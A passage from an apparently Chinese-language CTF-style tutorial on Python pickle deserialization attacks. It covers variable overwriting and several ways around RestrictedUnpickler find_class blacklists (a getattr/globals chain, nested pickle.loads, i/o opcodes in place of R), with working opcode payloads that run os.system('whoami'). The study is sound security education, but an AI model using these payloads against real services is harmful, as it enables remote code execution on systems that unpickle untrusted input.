+<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>在 session 或者 token 中，由于需要存储一些用户信息，所以我们常常能看到 pickle 的影子，程序会将用户的各种信息序列化并且存储在 session 或者 token 中，以此来验证用户身份</p>
+<p>如果 session 或者 token 是以明文的方式存储的，我们就有可能通过变量覆盖的方式来进行身份伪造</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#secret.py</span></span><br><span class="line">secret = <span class="string">&quot;this is a key&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secret = &quot;</span> + secret.secret)</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;secret&#x27;</span></span><br><span class="line"><span class="string">S&#x27;hack!!!&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">fake = pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secret = &quot;</span> + fake.secret)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240925204017160.png" alt="image-20240925204017160"></p>
+<p>来解释一下这个过程</p>
+<p>首先通过字节码 c 来获取 _<em>.main</em>_.secret 模块，然后再将 secret 和 hack!!! 两个字符串压入栈中，然后通过字节码 d 将两个字符串组成字典 {‘secret’:’hack!!!’} 的形式</p>
+<p>在 pickle 中，反序列化后的数据会以 key-value 的形式存储，因此 secret 模块中的变量 <code>secret = &#39;this is a key&#39;</code> 是以 <code>&#123;&#39;secret&#39;:&#39;this is a key&#39;&#125;</code> 的模式存储的</p>
+<p>最后再通过字节码 b 来执行 _<em>dict</em>_.update()，最后执行的结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;secret&#x27;:&#x27;This is a key&#x27;&#125;.update(&#123;&#x27;secret&#x27;:&#x27;Hack!!!&#x27;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>覆盖成功</p>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="绕过-RestrictedUnpickler-限制"><a href="#绕过-RestrictedUnpickler-限制" class="headerlink" title="绕过 RestrictedUnpickler 限制"></a>绕过 RestrictedUnpickler 限制</h3><p>想要绕过 find_class，我们需要了解他被调用的时机，在<a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#restricting-globals">官方文档</a>中描述如下</p>
+<blockquote>
+<p><em>出于这样的理由，你可能会希望通过定制</em> <a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle.Unpickler.find_class"><code>Unpickler.find_class()</code></a> <em>来控制要解封的对象。 与其名称所提示的不同，</em><strong><a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle.Unpickler.find_class"><code>Unpickler.find_class()</code></a> 会在执行对任何全局对象（例如一个类或一个函数）的请求时被调用</strong><em>。 因此可以完全禁止全局对象或是将它们限制在一个安全的子集中。</em></p>
+</blockquote>
+<p>在 opcode 中，c，i，\x93 这三个字节码都与全局对象有关，当出现这三个字节码的时候就会调用到 find_class，在使用这三个字节码的时候不违反其限制即可</p>
+<p>下面来细讲 bypass</p>
+<h4 id="builtins-绕过"><a href="#builtins-绕过" class="headerlink" title="builtins 绕过"></a>builtins 绕过</h4><p>在一些例子中，我们常常会见到 <code>moudle == &quot;builtins&quot;</code> 这种限制，比如在官方文档中，只允许我们导入 builtins 这一模块</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br></pre></td></tr></table></figure>
+
+<p>builtins 是 python 中的一个内置模块，包含了许多我们常用的内置函数，因此 python 在启动的时候便已经自动导入了 builtins 模块</p>
+<p>我们来通过 <code>for i in sys.moudles[&#39;builtins&#39;].__dict__:print(i)</code> 来查看该模块中包含的所有模块函数</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240925213600065.png" alt="image-20240925213600065"></p>
+<p>假如内置函数中一些命令执行的函数也被禁用了，如果依旧想尝试 RCE，我们就得尝试用类似于 python 中沙箱逃逸的方式来进行逃逸</p>
+<p>下面是一个例子，来自 code-breaking 2018 picklecode</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure>
+
+<h5 id="getattr-绕过"><a href="#getattr-绕过" class="headerlink" title="getattr() 绕过"></a>getattr() 绕过</h5><p>可以看到，在这里没有禁止 getattr 函数，我们可以借鉴 python 沙箱逃逸的思路，getattr 可以用于获取对象的属性值，因此我们可以通过如下的构造来获取 eval 函数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">builtins.<span class="built_in">getattr</span>(builtins, <span class="string">&#x27;eval&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240925230750081.png" alt="image-20240925230750081"></p>
+<p>下面只需要想办法构造出一个 builtins 模块来传给 getattr 的第一个参数，第二个参数则是 eval</p>
+<p>首先我们使用 globals() 函数来获取 builtins 模块中包含的内容</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926170738745.png" alt="image-20240926170738745"></p>
+<p>显然，globals() 函数返回的是一个字典，对此我们还需要 get 函数来获取</p>
+<p>因此我们最终的 payload 如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">builtins.<span class="built_in">getattr</span>(builtins.<span class="built_in">getattr</span>(builtins.<span class="built_in">dict</span>,<span class="string">&#x27;get&#x27;</span>)(builtins.<span class="built_in">globals</span>(),<span class="string">&#x27;builtins&#x27;</span>),<span class="string">&#x27;eval&#x27;</span>)(command)</span><br></pre></td></tr></table></figure>
+
+<p>下面开始编写 opcode</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 get 函数</span></span><br><span class="line">opcode1 = <span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pickletools.dis(opcode1)</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode1))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 globals 函数</span></span><br><span class="line">opcode2 = <span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)R.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pickletools.dis(opcode2)</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode2))</span><br></pre></td></tr></table></figure>
+
+<p>两段代码运行结果如下</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926172125658.png" alt="image-20240926172125658"></p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926172148903.png" alt="image-20240926172148903"></p>
+<p>那么下面要做的就是将两者合起来</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 builtins 模块</span></span><br><span class="line">opcode3 = <span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)RS&#x27;__builtins__&#x27;</span></span><br><span class="line"><span class="string">tRS&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 简单解释一下，除去连接两部分去掉中间的停止符 . 外，还要在引入 globals 函数后再压入一个空元组，当然这里 ) 也能改为 (t，压入空元组是为了使 R 指令正常执行（前文已经提到过，R 指令要求第一个参数是函数，第二个参数是元组）</span></span><br><span class="line">pickletools.dis(opcode1)</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode1))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926172237423.png" alt="image-20240926172237423"></p>
+<p>获取成功</p>
+<p>最后再是获取到函数 eval 并且执行，构造思路如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">.....	# 获取到的 builtins 模块</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;		# 压入 eval 字符串，随后 tR 获取 eval 函数</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;		# 压入命令执行函数最后执行</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload 如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行</span></span><br><span class="line">opcode4 = <span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)RS&#x27;__builtins__&#x27;</span></span><br><span class="line"><span class="string">tRS&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickletools.dis(opcode4)</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode4))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行成功</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926175657631.png" alt="image-20240926175657631"></p>
+<p>当然，如果不想手写 opcode 的话，也可以尝试使用 pker 工具来辅助生成 opcode</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload.py</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#获取getattr函数</span></span><br><span class="line"><span class="built_in">getattr</span> = GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="comment">#获取字典的get方法</span></span><br><span class="line">get = <span class="built_in">getattr</span>(GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>), <span class="string">&#x27;get&#x27;</span>)</span><br><span class="line"><span class="comment">#获取globals方法</span></span><br><span class="line">golbals=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>)</span><br><span class="line"><span class="comment">#获取字典</span></span><br><span class="line">builtins_dict=golbals()</span><br><span class="line"><span class="comment">#获取builtins模块</span></span><br><span class="line">__builtins__ = get(builtins_dict, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line"><span class="comment">#获取eval函数</span></span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">getattr</span>(__builtins__,<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="pickle-loads-构造"><a href="#pickle-loads-构造" class="headerlink" title="pickle.loads() 构造"></a>pickle.loads() 构造</h5><p>globals() 函数含有 python 中提前设置好的全局变量，包括我们 import 的各种模块，因此我们可以尝试获取 pickle 模块并且使用 pickle.loads() 函数来绕过 find_class()</p>
+<p>但是，pickle.loads() 接收的参数类型为 byte 类型，在 Protocol 0 中，对于 byte 类型没有很好的支持，需要再导入 encode() 函数，这可能会导致无法绕过 find_class</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">b=<span class="string">b&#x27;abcdef&#x27;</span></span><br><span class="line">opcode=pickle.dumps(b,protocol=<span class="number">0</span>)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br><span class="line">   <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;_codecs encode&#x27;</span></span><br><span class="line">   <span class="number">16</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">19</span>: (    MARK</span><br><span class="line">   <span class="number">20</span>: V        UNICODE    <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line">   <span class="number">28</span>: p        PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">31</span>: V        UNICODE    <span class="string">&#x27;latin1&#x27;</span></span><br><span class="line">   <span class="number">39</span>: p        PUT        <span class="number">2</span></span><br><span class="line">   <span class="number">42</span>: t        TUPLE      (MARK at <span class="number">19</span>)</span><br><span class="line">   <span class="number">43</span>: p    PUT        <span class="number">3</span></span><br><span class="line">   <span class="number">46</span>: R    REDUCE</span><br><span class="line">   <span class="number">47</span>: p    PUT        <span class="number">4</span></span><br><span class="line">   <span class="number">50</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>在 protocol 3，python 引入了 B 和 C 两个字节码来表示 byte 类型</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Protocol 3 (Python 3.x)</span></span><br><span class="line"> </span><br><span class="line">BINBYTES       = <span class="string">b&#x27;B&#x27;</span>   <span class="comment"># push bytes; counted binary string argument</span></span><br><span class="line">SHORT_BINBYTES = <span class="string">b&#x27;C&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">b=<span class="string">b&#x27;abcdef&#x27;</span></span><br><span class="line">opcode=pickle.dumps(b,protocol=<span class="number">0</span>)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: C    SHORT_BINBYTES <span class="string">b&#x27;abcdef&#x27;</span></span><br><span class="line">   <span class="number">10</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">12</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，此时 pickle 对 byte 类型变量的支持精简了很多，因此我们最好选择 protocol 3 的版本进行 opcode 的构造</p>
+<p>下面开始尝试构造 protocol 3 的 payload</p>
+<p>首先还是获取 get 函数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Op</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">getattr</span>,(builtins.<span class="built_in">dict</span>,<span class="string">&#x27;get&#x27;</span>,))</span><br><span class="line"> </span><br><span class="line">op=Op()</span><br><span class="line">opcode=pickle.dumps(op,protocol=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="string">b&#x27;\x80\x03cbuiltins\ngetattr\nq\x00cbuiltins\ndict\nq\x01X\x03\x00\x00\x00getq\x02\x86q\x03Rq\x04.&#x27;</span></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;builtins getattr&#x27;</span></span><br><span class="line">   <span class="number">20</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">22</span>: c    GLOBAL     <span class="string">&#x27;builtins dict&#x27;</span></span><br><span class="line">   <span class="number">37</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">39</span>: X    BINUNICODE <span class="string">&#x27;get&#x27;</span></span><br><span class="line">   <span class="number">47</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">49</span>: \x86 TUPLE2</span><br><span class="line">   <span class="number">50</span>: q    BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">52</span>: R    REDUCE</span><br><span class="line">   <span class="number">53</span>: q    BINPUT     <span class="number">4</span></span><br><span class="line">   <span class="number">55</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>其中有很多 q\x0n 字节码，去掉也依旧可以保证运行</p>
+<p>构造思路和 protocol 0 类似，先构造出 pickle.loads() 函数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntR.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode))</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function loads&gt;</span><br></pre></td></tr></table></figure>
+
+<p>再生成我们要执行的 payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Command</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        command=<span class="string">&quot;whoami&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"> </span><br><span class="line">op=Command()</span><br><span class="line">opcode=pickle.dumps(op,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="string">b&#x27;cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们来看一下 pickle.loads(payload) 的字节码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">bin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (pickle.loads,(<span class="string">b&#x27;&#x27;&#x27;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&#x27;&#x27;&#x27;</span>,))</span><br><span class="line"> </span><br><span class="line">b=<span class="built_in">bin</span>()</span><br><span class="line"><span class="comment"># b=b&#x27;abcdef&#x27;</span></span><br><span class="line">opcode=pickle.dumps(b,protocol=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="string">b&quot;\x80\x03c_pickle\nloads\nq\x00C\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.q\x01\x85q\x02Rq\x03.&quot;</span></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;_pickle loads&#x27;</span></span><br><span class="line">   <span class="number">17</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">19</span>: C    SHORT_BINBYTES <span class="string">b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;</span></span><br><span class="line">   <span class="number">46</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">48</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">49</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">51</span>: R    REDUCE</span><br><span class="line">   <span class="number">52</span>: q    BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">54</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>在这里，我们使用了字节码 C 来表示 byte 类型，并在后面跟上数据长度的十六进制，最后将我们的命令部分和上文构造好的 pickle.loads() 合并即可</p>
+<p>最后 payload 如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntRC\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.\x85R.&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="R-指令绕过"><a href="#R-指令绕过" class="headerlink" title="R 指令绕过"></a>R 指令绕过</h4><p>上面的方法能够绕过对 moudle 和函数的限制，但是其本质依旧是 _<em>reduce</em>_ 函数的重写。如果将 R 指令也禁用了，那么该如何再绕过呢</p>
+<p>除去 R 指令外，opcode 中还有指令 i，o 与命令执行相关，可以尝试用指令 i，o 来绕过</p>
+<p>我们先来看一个例子</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> stao</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, category</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.category = category</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> <span class="variable language_">self</span>.name == other.name <span class="keyword">and</span> <span class="variable language_">self</span>.category == other.category</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no reduce!&#x27;</span></span><br><span class="line">    x=pickle.loads(data)</span><br><span class="line">    <span class="keyword">if</span>(x!= Animal(stao.name,stao.age)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not equal&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;well done! &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(stao.name,stao.age))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#stao.py</span></span><br><span class="line"> </span><br><span class="line">name=<span class="string">&quot;stao&quot;</span></span><br><span class="line">age=<span class="number">18</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="i-指令"><a href="#i-指令" class="headerlink" title="i 指令"></a>i 指令</h5><p>上文提到过，i 指令相当于 c 和 o 的组合，也就是先获取一个全局函数，再寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数</p>
+<p>payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;(S&#x27;stao&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="o-指令"><a href="#o-指令" class="headerlink" title="o 指令"></a>o 指令</h5><p>o 指令是寻找栈中的上一个 MARK，在两个 MARK 之间，第一个数据必须为函数，第 2 - n 个数据为参数并执行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c(__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&#x27;stao&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="b-指令"><a href="#b-指令" class="headerlink" title="b 指令"></a>b 指令</h5><p>b 指令是用于执行 __setstate__ 或者 __dict__.update()，用于更新栈上的一个字典进行变量覆盖</p>
+<p>在 python 中，关于存储对象的状态，一般用到两个方法，一个是 __getstate__，而另一个则是__setstate__。在 pickle 中，同样可以存储对象属性的状态，所以这两个魔术方法主要是针对那些不可被序列化的状态，比如一个被打开的文件句柄 open(file, ‘r’)</p>
+<p>来看一个例子</p>
